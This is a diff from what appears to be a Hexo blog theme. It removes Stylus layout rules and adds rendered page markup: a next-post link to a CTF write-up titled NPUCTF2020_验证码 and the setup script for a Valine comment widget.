+                        <a class="next"
+                           rel="next"
+                           href="/2021/11/30/NPUCTF2020-%E9%AA%8C%E8%AF%81%E7%A0%81/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">NPUCTF2020_验证码</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
 
-  }
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
 
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
 
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
 
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
 
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
 
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-  }
-
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
-
-
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-
-      +keep-tablet() {
-        display: none;
-      }
-    }
-
-  }
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
 
 
-}
 
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
 
 
                 
